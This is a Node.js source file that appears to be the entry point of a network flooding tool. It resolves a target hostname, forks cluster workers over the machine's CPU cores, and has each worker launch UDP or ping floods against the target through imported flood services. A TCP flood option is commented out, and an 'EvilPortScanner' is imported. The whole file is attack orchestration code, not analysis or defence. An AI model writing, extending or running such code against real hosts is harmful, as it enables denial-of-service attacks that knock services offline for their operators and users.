var cluster = require('cluster');
var Confirm = require('prompt-confirm');
var udpFlood = require('./services/UdpFloodService');
var pingFlood = require('./services/PingFloodService');
var program = require('commander');
var programHelp = require('./services/ProgramHelpService')(program);
// const tcpFlood = require('./services/TcpFloodService');
var resolveHostname = require('./services/DnsResolver');
var scanPortsForIp = require('./services/EvilPortScanner');
var http = require('http');
var numCPUs = require('os').cpus().length;
var tcpPortUsed = require('tcp-port-used');
var options = {
    target: '127.0.0.1',
    port: '21-23',
    status: 'TROU',
    banner: true
};
var question = new Confirm('CAUTION: You are running flood without any timeout to stop, you can define a timeout with --timeout. Continue? [Y/N] ');
var resolvedIps = null;
var host = program.host || 'localhost';
var type = program.type || 'UDP';
var port = program.port || 3000;
var timeout = program.timeout || 10000;
tcpPortUsed.check(3000, '127.0.0.1')
    .then(function (inUse) {
        console.log('Port 3000 usage: ' + inUse + ' pid: ' + process.pid);
    }, function (err) {
        console.error('Error on check:', err.message);
    });
if (host) {
    if (cluster.isMaster) {
        resolveHostname(host)
            .then(function (ips) {
                var resolvedIpsEnvVar = {};
                resolvedIpsEnvVar["IPS"] = ips[0].address;
                console.log("Found ips for " + host + ": " + JSON.stringify(ips));
                console.log("Master " + process.pid + " is running");
                // Fork workers.
                for (var i = 0; i < (numCPUs / 4); i++) { //TODO change me to use all cores
                    cluster.fork(resolvedIpsEnvVar);
                }
                cluster.on('exit', function (worker, code, signal) {
                    console.log("EXITING: worker " + worker.process.pid + " died code:" + code + " signal: " + signal);
                });
            }).catch(function (error) {
            throw error;
        });
    } else {
        console.log("Worker " + process.pid + " started");
        //Each core will search for a fraction of open ports
        // for the given discovered ips and pass the fractioned total result to the workers
        // we need a function here to get the IPS from the env variables
        switch (type) {
            // case 'TCP':
            //     tcpFlood(host, port, timeout, process.pid);
            //     break;
            case 'UDP':
                udpFlood(process.env['IPS'], port, timeout, process.pid);
                break;
            case 'PING':
                pingFlood(process.env['IPS'], port, timeout, process.pid);
                break;
            default:
                udpFlood(process.env['IPS'], port, timeout, process.pid);
        }
    }
} else {
    programHelp.help();
}
